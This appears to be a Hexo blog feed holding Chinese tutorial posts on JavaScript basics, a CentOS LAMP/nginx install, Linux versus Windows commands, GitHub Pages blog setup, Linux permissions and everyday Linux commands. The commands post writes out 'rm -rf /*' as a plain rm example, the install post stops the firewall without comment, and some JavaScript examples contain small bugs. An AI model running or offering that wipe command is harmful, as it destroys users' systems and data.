&#125;;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">document</span>.write(person.firstName);<span class="comment">//常用访问对象</span></span><br><span class="line">   <span class="built_in">document</span>.write(person[<span class="string">&quot;firstname&quot;</span>]);</span><br></pre></td></tr></table></figure><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>js中一切皆对象！！</p><ul><li><strong>创建字符串的三种方法</strong></li></ul><p>eg：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str1 = <span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> str2 = <span class="built_in">String</span>(<span class="string">&#x27;welcome&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> str3 = <span class="string">&#x27;icq&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.write(str1+<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="built_in">document</span>.write(str2+<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="built_in">document</span>.write(str3+<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li><strong>常用字符串的方法</strong></li></ul><p>有对象就有属性和方法</p><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>toLowerCase、toUpperCase</td><td>转小写、大写</td></tr><tr><td>indexOf</td><td>查找字符串、返回索引值</td></tr><tr><td>substring</td><td>返回被操作字符串的一个子字符串</td></tr><tr><td>substr</td><td>返回被操作字符串的一个子字符串</td></tr><tr><td>split</td><td>将字符串按照指定的分隔符分割成数组</td></tr><tr><td>trim</td><td>清空空格</td></tr><tr><td>match</td><td>查找指定的值，返回匹配的值</td></tr><tr><td>search</td><td>检索字符串首次出现的位置</td></tr><tr><td>replace</td><td>替换指定字符串</td></tr></tbody></table><p>字符串</p><p>replace<br>eg:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> txt = <span class="string">&quot;hello world!!&quot;</span></span><br><span class="line"><span class="keyword">var</span> retxt = txt.replace(<span class="string">&quot;world&quot;</span>,<span class="string">&quot;dashuaibi&quot;</span>);</span><br><span class="line"><span class="built_in">document</span>.write(txt);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="built_in">document</span>.write(retxt);</span><br></pre></td></tr></table></figure><ul><li><strong>常用字符串属性</strong></li></ul><p><strong>length</strong></p><p>eg：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> txt = <span class="string">&quot;ABCDEFGHJKDSDETDSSQWEVBTNVNBBvfvsv&quot;</span></span><br><span class="line"><span class="keyword">var</span> changdu = txt.length;</span><br><span class="line"><span class="built_in">document</span>.write(changdu);</span><br></pre></td></tr></table></figure><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>eg：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="built_in">Array</span> = [<span class="string">&quot;Audi&quot;</span>,<span class="string">&quot;bmw&quot;</span>,<span class="string">&quot;porsche&quot;</span>,<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;ddd&quot;</span>,<span class="string">&quot;666&quot;</span>]</span><br><span class="line"><span class="built_in">Array</span>[<span class="number">0</span>] = benz;<span class="comment">//修改数组里的值</span></span><br><span class="line"><span class="built_in">Array</span>[<span class="number">2</span>] = toyota;<span class="comment">//修改数组里的值</span></span><br><span class="line"><span class="built_in">document</span>.write(<span class="built_in">Array</span>);<span class="comment">//输出数组</span></span><br><span class="line"><span class="built_in">document</span>.write(<span class="built_in">Array</span>[<span class="number">1</span>]);<span class="comment">//索引数组里的0号位，即Audi</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>centos-nginx+apache+mysql+php的安装</title>
      <link href="/posts/22236/"/>
      <url>/posts/22236/</url>
      
        <content type="html"><![CDATA[<h2 id="nginx源码安装"><a href="#nginx源码安装" class="headerlink" title="nginx源码安装"></a>nginx源码安装</h2><h5 id="安装nginx依赖"><a href="#安装nginx依赖" class="headerlink" title="安装nginx依赖"></a>安装nginx依赖</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#yum install gcc pcre pcre-devel zlib zlib-devel openssl openssl-devel -y</span><br></pre></td></tr></table></figure><h5 id="配置开启参数及模块，生成makefile文件"><a href="#配置开启参数及模块，生成makefile文件" class="headerlink" title="配置开启参数及模块，生成makefile文件"></a>配置开启参数及模块，生成makefile文件</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[root@localhost ~]#./configure --conf-path=/etc/nginx/nginx.conf --sbin-path=/usr/bin/nginx  //这里是加载模块 --add-module=/root/nginx-http-flv-module-master</span><br></pre></td></tr></table></figure><h5 id="生成脚本及配置文件：make，编译步骤，根据Makefile文件生成相应的模块，创建目录，并将生成的模块和文件复制到相应的目录："><a href="#生成脚本及配置文件：make，编译步骤，根据Makefile文件生成相应的模块，创建目录，并将生成的模块和文件复制到相应的目录：" class="headerlink" title="生成脚本及配置文件：make，编译步骤，根据Makefile文件生成相应的模块，创建目录，并将生成的模块和文件复制到相应的目录："></a>生成脚本及配置文件：make，编译步骤，根据Makefile文件生成相应的模块，创建目录，并将生成的模块和文件复制到相应的目录：</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#make &amp;&amp; make install</span><br></pre></td></tr></table></figure><h5 id="系统服务配置"><a href="#系统服务配置" class="headerlink" title="系统服务配置"></a>系统服务配置</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#systemctl stop firewalld //关闭防火墙</span><br><span class="line">[root@localhost ~]#systemctl enable nginx //设置nginx开机启动</span><br><span class="line">[root@localhost ~]#systemctl start nginx //启动服务nginx</span><br></pre></td></tr></table></figure><h5 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#nginx</span><br></pre></td></tr></table></figure><h2 id="安装apache-及相关依赖"><a href="#安装apache-及相关依赖" class="headerlink" title="安装apache 及相关依赖"></a>安装apache 及相关依赖</h2><blockquote><p>httpd就是apache开源的其中一个最有名的项目，即是apache</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#yum install httpd httpd-devel httpd-manual mod_ssl -y //安装httpd及依赖</span><br><span class="line">[root@localhost ~]#systemctl enable httpd  //设置httpd开机启动</span><br><span class="line">[root@localhost ~]#systemctl start httpd   //启动服务httpd</span><br><span class="line">[root@localhost ~]#yum install mariadb-server -y //安装mysql</span><br><span class="line">[root@localhost ~]#systemctl enable mariadb  //设置mariadb开机启动</span><br><span class="line">[root@localhost ~]#systemctl start mariadb   //启动服务mariadb</span><br><span class="line">[root@localhost ~]#mysql_secure_installation    //配置mysql</span><br><span class="line">[root@localhost ~]#yum install  php php-mysql php-common php-gd php-mbstring php-mcrypt php-devel php-xml -y        //安装PHP及相关依赖</span><br><span class="line">[root@localhost ~]#systemctl restart httpd    //重新启动httpd</span><br></pre></td></tr></table></figure><blockquote><p>Nginx默认web目录：/usr/local/nginx/html<br>Apache默认web目录：/var/www/html</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux与windows 命令的对比</title>
      <link href="/posts/3757/"/>
      <url>/posts/3757/</url>
      
        <content type="html"><![CDATA[<p>Windows不区分大小写，Linux区分大小写的。 </p><table><thead><tr><th>文件目录操作</th><th></th><th></th></tr></thead><tbody><tr><td>Command</td><td>Linux</td><td>Windows</td></tr><tr><td>批处理</td><td>.sh</td><td>.bat</td></tr><tr><td>帮助</td><td>cmd  –help / -h</td><td></td></tr><tr><td>列出目录文件</td><td>ls/  ls -l</td><td>dir</td></tr><tr><td>改变当前目录</td><td>cd</td><td>cd</td></tr><tr><td>进父目录</td><td>cd  …</td><td>cd  …</td></tr><tr><td>进home目录</td><td>cd  ~</td><td></td></tr><tr><td>复制</td><td>cp</td><td>copy</td></tr><tr><td>删除</td><td>rm  file_name</td><td>del  file_name</td></tr><tr><td>建目录</td><td>mkdir  folderName</td><td>md  folderName</td></tr><tr><td>建文件</td><td>touch  fileName</td><td>touch  fileName</td></tr><tr><td>删目录</td><td>rmdir  folderName</td><td>rmdir  folderName</td></tr><tr><td>设置目录文件权限</td><td>chmod  u+rwx file</td><td></td></tr><tr><td>设置目录文件所有者</td><td>chown  user.group file</td><td></td></tr></tbody></table><table><thead><tr><th>文件内容操作</th><th></th><th></th></tr></thead><tbody><tr><td>Command</td><td>Linux</td><td>Windows</td></tr><tr><td>显示文件内容</td><td>cat</td><td>type</td></tr><tr><td></td><td>more，less</td><td>more</td></tr><tr><td></td><td>head、tail</td><td></td></tr><tr><td>统计行数</td><td>wc</td><td></td></tr><tr><td>显示文件信息</td><td>file</td><td></td></tr><tr><td>查找文件</td><td>find  /bin -name ls</td><td></td></tr><tr><td>定位可执行文件位置</td><td>which</td><td></td></tr><tr><td>在文本文件内查找</td><td>grep  str1 1.txt</td><td>find</td></tr><tr><td>启动运行程序</td><td>gnome-open/open</td><td>start</td></tr></tbody></table><table><thead><tr><th>系统信息查询</th><th></th><th align="center"></th></tr></thead><tbody><tr><td>Command</td><td>Linux</td><td align="center">Windows</td></tr><tr><td>显示内核版本</td><td>uname  -a</td><td align="center"></td></tr><tr><td>显示发布版本</td><td>lsb_release  -a</td><td align="center"></td></tr><tr><td></td><td>cat  /etc/issue</td><td align="center"></td></tr><tr><td>显示id信息</td><td>id/whoami</td><td align="center"></td></tr><tr><td>显示当前登陆用户</td><td>who</td><td align="center"></td></tr><tr><td>显示当前环境信息</td><td>env</td><td align="center"></td></tr><tr><td>显示启动中检测到的硬件信息</td><td>dmesg</td><td align="center"></td></tr><tr><td>显示系统的PCI设备</td><td>lspci</td><td align="center"></td></tr><tr><td>显示系统的USB</td><td>lsusb</td><td align="center"></td></tr><tr><td>显示cpu信息</td><td>less  /proc/cpuinfo</td><td align="center"></td></tr><tr><td>显示内存</td><td>less  /proc/menminfo</td><td align="center"></td></tr><tr><td>显示硬盘存储信息</td><td>df  -h</td><td align="center"></td></tr></tbody></table><table><thead><tr><th>进程/任务控制</th><th></th><th></th></tr></thead><tbody><tr><td>Command</td><td>Linux</td><td>Windows</td></tr><tr><td>显示进程信息</td><td>ps  -auxf</td><td></td></tr><tr><td>杀死进程</td><td>kill  proc_id</td><td></td></tr><tr><td>杀死所有</td><td>killall  postgresql</td><td></td></tr><tr><td>暂停中断当前前台任务</td><td>ctrl  - z</td><td></td></tr><tr><td>恢复任务到后台</td><td>bg</td><td></td></tr><tr><td>恢复任务到前台</td><td>fg</td><td></td></tr></tbody></table><table><thead><tr><th>网络命令</th><th></th><th></th></tr></thead><tbody><tr><td>Command</td><td>Linux</td><td>Windows</td></tr><tr><td>显示启动的网络服务</td><td>netstat  -anli less</td><td>netstat</td></tr><tr><td>显示路由表信息</td><td>netstat  -r</td><td>netstat  -r</td></tr><tr><td>显示ip</td><td>ip  a/ifconfig</td><td>ipconfig</td></tr><tr><td>显示防火墙信息</td><td>iptables  -list</td><td></td></tr><tr><td>远程登陆</td><td>ssh  user@host</td><td></td></tr><tr><td>发送ping信息</td><td>ping  ip</td><td>ping  ip</td></tr><tr><td>命令行下载</td><td>wget  url/curl -o url</td><td></td></tr></tbody></table><table><thead><tr><th>用户管理</th><th></th><th></th></tr></thead><tbody><tr><td>Command</td><td>Linux</td><td>Windows</td></tr><tr><td>修改命令</td><td>passwd</td><td></td></tr><tr><td>创建用户</td><td>useradd</td><td></td></tr><tr><td>删除用户</td><td>userdel</td><td></td></tr><tr><td>修改用户</td><td>usermod</td><td></td></tr><tr><td>退出</td><td>exit  / ctrl + D</td><td></td></tr><tr><td>切换用户至（默认root）</td><td>su  [-]user</td><td></td></tr><tr><td>以su后的权限执行</td><td>sudo  -u user cmd</td><td></td></tr></tbody></table><table><thead><tr><th>其他</th><th></th><th></th></tr></thead><tbody><tr><td>Command</td><td>Linux</td><td>Windows</td></tr><tr><td>显示日期时间</td><td>date</td><td>date</td></tr><tr><td>日历</td><td>cal2014</td><td></td></tr><tr><td>清除屏幕</td><td>clear</td><td>cls</td></tr><tr><td>搜索软件包</td><td>yum  search tree</td><td></td></tr><tr><td>删除软件包</td><td>yum  remove pkg_name</td><td></td></tr><tr><td>安装软件包</td><td>yum  install pkg_name</td><td></td></tr><tr><td>重启系统</td><td>reboot</td><td></td></tr><tr><td>关闭系统</td><td>halt  -p</td><td></td></tr><tr><td>设置环境变量</td><td>export  PATH=SPATH：～/bin</td><td>set</td></tr><tr><td>显示信息/环境变量</td><td>echo  $HOME</td><td>echo</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> 命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>github搭建hexo-blog及域名配置</title>
      <link href="/posts/12629/"/>
      <url>/posts/12629/</url>
      
        <content type="html"><![CDATA[<p>免费无需云服务器，安全稳定，极低的维护成本，无需备案，域名使用godaddy，顶级域名.cc.me.pw.几块钱一个，搭建blog方便快捷。</p><h3 id="安装hexo及环境"><a href="#安装hexo及环境" class="headerlink" title="安装hexo及环境"></a>安装hexo及环境</h3><p>安装 nodejs</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">choco install nodejs</span><br></pre></td></tr></table></figure><p>安装git</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">choco install git</span><br></pre></td></tr></table></figure><p>npm安装hexo</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><p>创建目录blog-name并拉取hexo源码，需要CD到指定目录执行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init blog-name</span><br></pre></td></tr></table></figure><p>测试是否安装成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></table></figure><h3 id="github部署"><a href="#github部署" class="headerlink" title="github部署"></a>github部署</h3><p>注册github.com账号生成密钥</p><p>本地生成密钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096 -C <span class="string">&quot;你的邮箱&quot;</span></span><br></pre></td></tr></table></figure><p>敲回车键三次</p><p>复制刚刚创建的密钥<code>windows</code> 用户可以在 <code>C://用户//admin//.ssh</code> 目录下查找，mac 用户可以在 <code>~/.ssh</code> 目录下找到。复制 <code>id_rsa.pub</code> 文件里的信息</p><p>粘贴到—githup点击头像—Settings—SSH and GPG keys—设置SSH keys</p><p>此时你还需要配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;liuxianan&quot;</span>// 你的github用户名，非昵称</span><br><span class="line">git config --global user.email  <span class="string">&quot;xxx@qq.com&quot;</span>// 填写你的github注册邮箱</span><br></pre></td></tr></table></figure><p>github新建项目</p><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20211217231243707.png" alt="image-20211217231243707"></p><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20211217231438850.png" alt="image-20211217231438850"></p><p>修改站点配置文件 _config.yml 配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:bbbstark/bstarks.git</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure><p>安装 hexo-deployer-git</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo generate</span><br></pre></td></tr></table></figure><p>运行 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo deploy</span><br></pre></td></tr></table></figure><h3 id="github域名绑定"><a href="#github域名绑定" class="headerlink" title="github域名绑定"></a>github域名绑定</h3><p>godaddy注册域名<br>注册域名可支付宝付款。</p><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20211218201701123.png" alt="image-20211218201701123"></p><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20211218201511019.png" alt="image-20211218201511019"></p><p>添加DNS  A记录 其中2条即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">185.199.108.153</span><br><span class="line">185.199.109.153</span><br><span class="line">185.199.110.153</span><br><span class="line">185.199.111.153</span><br></pre></td></tr></table></figure><p>添加CNAME记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GitHub用户名.github.io .</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20211218201556457.png" alt="image-20211218201556457"></p><p>如图添加完后 等待 DNS 配置生效，一般10分钟内就会生效。</p><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20211218201429680.png" alt="image-20211218201429680"></p>]]></content>
      
      
      
        <tags>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux 用户权限控制</title>
      <link href="/posts/35674/"/>
      <url>/posts/35674/</url>
      
        <content type="html"><![CDATA[<h2 id="用户权限"><a href="#用户权限" class="headerlink" title="用户权限"></a>用户权限</h2><p>\1. 超级用户：拥有对系统的最高管理权限，默认是root用户 </p><p>\2. 普通用户：只能对自己目录下的文件进行访问和修改，具有登录到系统的权限</p><p>\3. 虚拟用户：不能登录系统，主要是方便管理系统，如：bin、adm、nobody用户等</p><ul><li>/etc/passwd 存储当前系统中所有用户的信息（密码除外）</li></ul><table><thead><tr><th>user</th><th>x</th><th>123</th><th>456</th><th>xxx</th><th>/home/user</th><th>/bin/bash</th></tr></thead><tbody><tr><td>用户名</td><td>密码占位符</td><td>用户编号</td><td>用户组编号</td><td>用户注释信息</td><td>用户家目录</td><td>shell类型</td></tr></tbody></table><ul><li>/etc/shadow 存储当前系统中所有用户的密码信息</li></ul><table><thead><tr><th>user</th><th>$v.afdie34</th><th>:::::</th></tr></thead><tbody><tr><td>用户名</td><td>用户密码</td><td>其他内容</td></tr></tbody></table><p>• 第一个字段（root）：用户名</p><p>• 第二个字段（$…0）：加密后的密码（盐值加密）</p><p>• 第三个字段：密码的最后一次修改时间（元年计 数， 1970年1月1日作为1 ） </p><p>• 第四个字段：密码在多少天内不能更改</p><p>• 第五个字段（99999）：密码在多少天后必须更改 </p><p>• 第六个字段（7）：密码到期前多少天给用户发出警告 </p><p>• 第七个字段：密码在多少天后用户账户将被禁用</p><p>• 第八个字段：密码将禁用的具体日期</p><p>• 第九个字段：保留字段</p><ul><li>/etc/group 存储当前系统中所有用户组信息</li></ul><table><thead><tr><th>group</th><th>x</th><th>123</th><th>qwe,abc,zxz</th></tr></thead><tbody><tr><td>组名称</td><td>组密码占位符</td><td>组编号</td><td>组中用户名列表</td></tr></tbody></table><p>• 第一个字段（root）：用户组的组名 </p><p>• 第二个字段（x）：加密后的用户组密码 </p><p>• 第三个字段（0）：用户组ID，GID </p><p>• 第四个字段（空值）：用户组的成员列表，多个组成员用逗号分隔</p><ul><li>/etc/gshadow 存储用户组密码的一类信息</li></ul><table><thead><tr><th>group</th><th>$v.afdie34</th><th>abc</th><th>xyz,qwe</th></tr></thead><tbody><tr><td>用户名</td><td>组密码</td><td>用户组管理员</td><td>用户组的成员列表</td></tr></tbody></table><ul><li><strong>用户命令</strong></li></ul><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>useradd 用户名</td><td>创建用户同时创建与用户同名的组</td></tr><tr><td>useradd -g 组名 用户名</td><td>创建用户并指定用户组</td></tr><tr><td>useradd 用户名 -s xxx</td><td>创建用户并指定登录使用的shell,值为/sbin/nologin或bin/false,禁止登录</td></tr><tr><td>usermod -g 用户组 用户名</td><td>修改用户所在的用户组</td></tr><tr><td>usermod -l 新用户名 用户名</td><td>修改用户名</td></tr><tr><td>userdel 用户名</td><td>删除用户,不删除家目录,-r删除家目录.</td></tr><tr><td>passwd</td><td>修改用户密码,如果新用户则创建新密码</td></tr></tbody></table><ul><li><strong>用户组命令</strong></li></ul><table><thead><tr><th>命令</th><th></th></tr></thead><tbody><tr><td>groupadd 组名</td><td>创建用户组</td></tr><tr><td>group -g 组编号 组名</td><td>创建用户组同时指定编号</td></tr><tr><td>groupmod -n 新组名 旧组名</td><td>修改用户组名</td></tr><tr><td>groupmod -g 组编号 组名</td><td>修改用户组组编号</td></tr><tr><td>groupdel 组名</td><td>删除指定用户组</td></tr><tr><td>gpasswd</td><td>修改设置用户组密码</td></tr></tbody></table><h2 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h2><ul><li><strong>ls -alh</strong></li></ul><p>· -a 显示所有文件及目录 (<strong>.</strong> 开头的隐藏文件也会列出)</p><p>· -l 除文件名称外，亦将文件型态、权限、拥有者、文件大小等资讯详细列出</p><p>· -h 显示所有文件及目录的大小</p><p><strong>R     W     X</strong></p><p><strong>4     2      1</strong></p><p><strong>读(read)  写(write)  执行x(execute)</strong></p><p>  <strong>rwx     rwx    rwx</strong></p><p>  <strong>421=7    421=7   421=7</strong>   </p><p><strong>文件所有者 文件所属组  其他用户</strong></p><p><strong>常用组合：777最高权限，644普通文件权限，755执行权限</strong></p><ul><li><strong>改变文件或者目录权限</strong></li></ul><p><strong>[root@localhost ~]# chmod [选项] 模式 文件名</strong></p><p>选项：-R 表示递归（Linux系统下子目录权限不继承父目录）</p><p><strong>权限字母表示法：[u、g、o、a] [+-=] [rwx]</strong> </p><p><strong>权限数字表示法：[mode=421]</strong></p><ul><li><strong>改变文件或者目录所有者</strong></li></ul><p>[root@localhost ~]# <strong>chown</strong> 所有者用户名 文件名 #修改文件所有者</p><p>[root@localhost ~]# <strong>chown</strong> 所有者:所属组 文件名 #同时改变所有者和所属组</p><p>Test：</p><p>[root@localhost ~]# <strong>chown</strong> icq test</p><p>[root@localhost ~]# <strong>chown</strong> icq:icqtest test</p><p>• 选项：-R 表示递归，处理指定目录及其子目录下的所有文件</p><ul><li><strong>改变文件或者目录的属组</strong></li></ul><p>• 选项：-R 表示递归，处理指定目录及其子目录下的所有文件</p><p>[root@localhost ~]# <strong>chgrp</strong> 用户组 文件或目录 #改变文件或目录的所属组</p><p>Test：</p><p>[root@localhost ~]# <strong>chgrp</strong> icqtest test.txt</p><ul><li><strong>设置文件的默认权限</strong></li></ul><p>[root@localhost ~]# <strong>umask</strong> [-S] #显示、设置文件的默认权限</p><p>参数说明： -S 以 rwx 形式显示新建文件的默认权限</p><p>• 如果用户建立文件，默认是没有可执行权限的，即权限表示为 –rw-rw-rw-，即666 </p><p>• 如果用户建立目录，默认权限是全开放的，即权限表示drwxrwxrwx，即777</p><ul><li><strong>Linux默认文件权限022</strong></li></ul><p>建立文件时，666-022== 644，即rw-r–r—</p><p>建立目录时，777-022== 755，即drwx-r-xr-x</p><p><strong>666-522=144</strong></p><p><strong>777-522=633</strong></p><p><strong>777</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>必背Linux基础命令</title>
      <link href="/posts/29722/"/>
      <url>/posts/29722/</url>
      
        <content type="html"><![CDATA[<h3 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h3><h5 id="常用关机命令"><a href="#常用关机命令" class="headerlink" title="常用关机命令"></a>常用关机命令</h5><p>poweroff<br>halt </p><h5 id="常用重启命令"><a href="#常用重启命令" class="headerlink" title="常用重启命令"></a>常用重启命令</h5><p>Reboot</p><h5 id="Init命令"><a href="#Init命令" class="headerlink" title="Init命令"></a>Init命令</h5><p>#init 0 - 停机（千万不能把initdefault 设置为0 ）<br>#init 1 - 单用户模式<br>#init 2 - 多用户，没有 NFS 不联网<br>#init 3 - 完全多用户模式(标准的运行级)<br>#init 4 - 没有用到<br>#init 5 - X11 （xwindow) 图形化界面模式<br>#init 6 - 重新启动 （千万不要把initdefault 设置为6 ）</p><h5 id="shutdown命令"><a href="#shutdown命令" class="headerlink" title="shutdown命令"></a>shutdown命令</h5><p>shutdown -c  取消前一个关机命令<br>shutdown -h 关机<br>Shutdown -h now<br>Shutdown -h 10<br>Shutdown -h 11:00<br>shutdown -r 重启<br>shutdown -r now<br>shutdown -r 10<br>shutdown -r 11:00</p><h3 id="系统文件增删改查类"><a href="#系统文件增删改查类" class="headerlink" title="系统文件增删改查类"></a>系统文件增删改查类</h3><h5 id="ls命令"><a href="#ls命令" class="headerlink" title="ls命令"></a>ls命令</h5><p>ll -a<br>-a 显示隐藏文件<br>-l  显示详细列表<br>-lR  显示所有子目录相信列表<br>-al  显示所有包含隐藏文件.的列表</p><h5 id="mkdir命令"><a href="#mkdir命令" class="headerlink" title="mkdir命令"></a>mkdir命令</h5><p>创建目录<br>Mkdir -p  递归创建所有目录 如：mkdir -p /a/b/c/d/e/f/<br>mkdir -p -m 755 d1/d2/d3/d4  创建并设置权限755的目录</p><h5 id="touch命令"><a href="#touch命令" class="headerlink" title="touch命令"></a>touch命令</h5><p>touch test.txt 创建文件<br>touch 改文件时间<br>touch -a -m -t -d -c 修改时间  年月日时分秒 2020-10-11 11:11:10 date.txt<br>rm -rf /* （-f强制删除，-r递归删除，i信息提示）</p><h5 id="cp命令"><a href="#cp命令" class="headerlink" title="cp命令"></a>cp命令</h5><p>cp -r /etc/ /root/bakcup/  （ -r 递归复制目录 -p 保留文件所有属性）</p><h5 id="mv命令"><a href="#mv命令" class="headerlink" title="mv命令"></a>mv命令</h5><p>mv {选项} 源文件 目标文件<br>-f强制覆盖 -i 信息交互提示 -v 显示移动过程</p><h5 id="查看命令"><a href="#查看命令" class="headerlink" title="查看命令"></a>查看命令</h5><p>cat 文件.TXT 查看文件<br>cat 文件1 文件2 &gt; 文件3  合并文件</p><p>more [选项] 文件名  显示预览文件<br>q 或 Q 退出 more。<br>v 在当前行启动一个编辑器。<br>/ 字符串 搜索指定的字符串。 d 向下移动半页。 b 向上移动一页。<br>回车键 向下移动一行。 空格键 向下移动一页。</p><p>head -n 5 a.txt  显示前5行</p><p>tail -n 5 b.txt 显示后5行<br>tail -f c.txt  实时显示最后10 行内容，用于查实时日志</p><h5 id="查找命令"><a href="#查找命令" class="headerlink" title="查找命令"></a>查找命令</h5><p>grep [选项] 模式 文件名  搜索符合关键字的文件内容并输出相关行<br>模式要么是字符（串），要么是正则表达式</p><h5 id="解压缩类"><a href="#解压缩类" class="headerlink" title="解压缩类"></a>解压缩类</h5><p>bz2格式用 -j  gz格式用Z，创建归档压缩  -z是压缩gz -j是压缩bz2<br>归档并压缩<br>tar -zcvf 文件名.tar.gz /download<br>tar -jcvf 文件名.tar.bz2 /tmp/<br>解包解压缩<br>tar -zxvf 文件名.tar.gz<br>tar -jxvf 文件名.tar.bz2<br>unzip 文件名.zip        解压<br>zip 文件名.zip  /upload    压缩<br>zip unzip 需要单独安装 centos 下 yum install -y zip&amp;unzip</p><h5 id="网络类"><a href="#网络类" class="headerlink" title="网络类"></a>网络类</h5><p>查看网络情况<br>netstat -ano  antlp  老版本<br>ss  -antlp  新版本  n显示端口还是名称</p><p>/etc/service   端口与服务的对于关系文件，所有Linux系统都有。</p><p>路由追踪<br>tracert.exe  ip //Windows<br>traceroute  IP //linux<br>解析ip<br>nslookup  baidu.com</p><h5 id="服务类"><a href="#服务类" class="headerlink" title="服务类"></a>服务类</h5><p>top  查看占用CPU占用信息   回车更新 Q退出<br>ps -aux  